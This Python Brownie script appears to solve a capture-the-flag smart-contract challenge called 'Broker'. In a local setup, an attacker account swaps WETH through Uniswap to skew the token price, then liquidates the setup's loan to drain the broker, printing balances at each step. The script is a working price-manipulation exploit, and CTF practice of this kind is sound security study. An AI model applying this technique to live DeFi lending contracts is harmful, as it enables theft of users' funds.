from brownie import (
    network,
    accounts,
    config,
    interface,
    BrokerSetup,
    Broker,
    BrokerToken,
)
from scripts.helpful_scripts import (
    get_account,
    check_solution
)
from web3 import Web3


def main():
    deployer = get_account(index=0)
    attacker = get_account(index=1)

    # setup challenge
    setup_contract = BrokerSetup.deploy({"from": deployer, "value": Web3.toWei(50, 'ether')})
    broker_contract = Broker.at(setup_contract.broker())
    
    router_contract = interface.IUniswapV2Router02("0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D")
    pair_contract = interface.IUniswapV2Pair(setup_contract.pair())
    weth_contract = interface.IWETH9(setup_contract.weth())
    token_contract = BrokerToken.at(setup_contract.token())

    # solve challenge
    print_state(setup_contract, broker_contract, pair_contract, weth_contract, token_contract, attacker)

    weth_contract.approve(router_contract, 2 ** 256 -1, {"from": attacker})
    token_contract.approve(router_contract, 2 ** 256 -1, {"from": attacker})
    weth_contract.approve(broker_contract, 2 ** 256 -1, {"from": attacker})
    token_contract.approve(broker_contract, 2 ** 256 -1, {"from": attacker})

    weth_contract.deposit({"from": attacker, "value": Web3.toWei(50, 'ether')})

    router_contract.swapExactTokensForTokens(
        Web3.toWei(14, 'ether'),
        0,
        [weth_contract, token_contract],
        attacker,
        2 ** 256 -1,
        {"from": attacker}
    )

    print_state(setup_contract, broker_contract, pair_contract, weth_contract, token_contract, attacker)

    broker_contract.liquidate(setup_contract, token_contract.balanceOf(attacker), {"from": attacker})

    print_state(setup_contract, broker_contract, pair_contract, weth_contract, token_contract, attacker)
    
    # check the solution
    check_solution(setup_contract)


def print_state(setup_contract, broker_contract, pair_contract, weth_contract, token_contract, attacker):
    print("Attacker balances:")
    print("ETH:",  Web3.fromWei(attacker.balance(), 'ether'))
    print("WETH:", Web3.fromWei(weth_contract.balanceOf(attacker), 'ether'))
    print("Tokens:", Web3.fromWei(token_contract.balanceOf(attacker), 'ether'))
    print()
    print("Broker balances:")
    print("ETH:",  Web3.fromWei(broker_contract.balance(), 'ether'))
    print("WETH:", Web3.fromWei(weth_contract.balanceOf(broker_contract), 'ether'))
    print("Tokens:", Web3.fromWei(token_contract.balanceOf(broker_contract), 'ether'))
    print()
    print("Reserves:", pair_contract.getReserves())
    print("Rate:", broker_contract.rate())
    print("Debt of setup:", broker_contract.debt(setup_contract))
    print("Safe debt of setup:", broker_contract.safeDebt(setup_contract))
    print()

    